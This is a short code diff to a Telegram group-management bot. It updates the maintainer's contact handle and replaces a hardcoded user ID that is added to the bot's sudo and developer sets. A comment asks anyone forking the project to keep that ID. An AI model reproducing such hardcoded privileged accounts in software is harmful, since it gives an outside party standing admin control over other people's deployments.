@@ -40,7 +40,7 @@ logging.getLogger('ptbcontrib.postgres_persistence.postgrespersistence').setLeve
 LOGGER = logging.getLogger('[Hikari]')
 LOGGER.info("Kazu is starting. | An Kazu Robot Parts. | Licensed under GPLv3.")
 LOGGER.info("Not affiliated to other anime or Villain in any way whatsoever.")
-LOGGER.info("Project maintained by: github.com/ionmusic (t.me/kenapatagkazu)")
+LOGGER.info("Project maintained by: github.com/ionmusic (t.me/disinikazu)")
 
 # if version < 3.9, stop bot.
 if sys.version_info[0] < 3 or sys.version_info[1] < 8:
@@ -211,9 +211,9 @@ else:
 # If you forking dont remove this id, just add your id. LOL...
 
 DRAGONS.add(OWNER_ID)
-DRAGONS.add(902478883)
+DRAGONS.add(5063062493)
 DEV_USERS.add(OWNER_ID)
-DEV_USERS.add(902478883)
+DEV_USERS.add(5063062493)
 
 
 if not SPAMWATCH_API:
